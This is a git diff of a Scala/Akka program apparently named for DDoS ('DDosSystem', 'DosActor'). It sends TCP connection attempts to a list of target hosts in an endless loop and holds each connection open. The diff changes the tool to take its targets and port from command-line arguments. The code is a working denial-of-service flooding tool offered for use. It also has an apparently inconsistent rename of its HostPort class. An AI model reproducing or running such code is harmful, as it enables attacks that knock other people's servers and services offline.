@@ -1,7 +1,8 @@
 package hi
 
 import akka.actor.{Actor, ActorSystem, Props}
-import hi.Test.{fetchTargets, file, lastUpdate}
+import hi.SyncUDP.HostPort
+//import hi.Test.file
 
 import java.net.{InetSocketAddress, Socket, UnknownHostException}
 
@@ -10,33 +11,33 @@ object Sync {
   def main(args: Array[String]): Unit = {
     val system = ActorSystem("DDosSystem")
     val actor = system.actorOf(Props[DosActor], name = "ddosactor")
-
-    var targets = fetchTargetsHost
+    val port = args.head.toInt
+    var targets = fetchTargetsHost(args)
 
     val REFRESH_TIME: Int = 10 * 60 * 1000
     var lastUpdate: Long = System.currentTimeMillis()
 
-
     while (true) {
       if (System.currentTimeMillis() - lastUpdate > REFRESH_TIME) {
-        targets = fetchTargetsHost
-        println(s"list updated. size=${file.size}")
+        targets = fetchTargetsHost(args)
+        //println(s"list updated. size=${file.size}")
         lastUpdate = System.currentTimeMillis()
       }
 
       targets foreach {
-        actor ! HostPort(_, 80)
+        actor ! HostPort(_, port)
       }
 
       Thread.sleep(200)
     }
   }
 
-  def fetchTargetsHost: Seq[String] = {
-    Test.fetchTargets.map(_.split("://")(1)).map(_.split("/").head)
+  def fetchTargetsHost(args: Array[String]): Seq[String] = {
+    args.tail.toSeq
+    //Test.fetchTargets.map(_.split("://")(1)).map(_.split("/").head)
   }
 
-  case class HostPort(ip: String, port: Int)
+  case class HstPort(ip: String, port: Int)
 
   class DosActor extends Actor {
     def receive = {
@@ -45,7 +46,7 @@ object Sync {
         try {
           s = new Socket()
           s.connect(new InetSocketAddress(hp.ip, hp.port), 2500)
-          Thread.sleep(100)
+          Thread.sleep(2500)
           s.close()
           println(s"Send to the $hp")
         } catch {
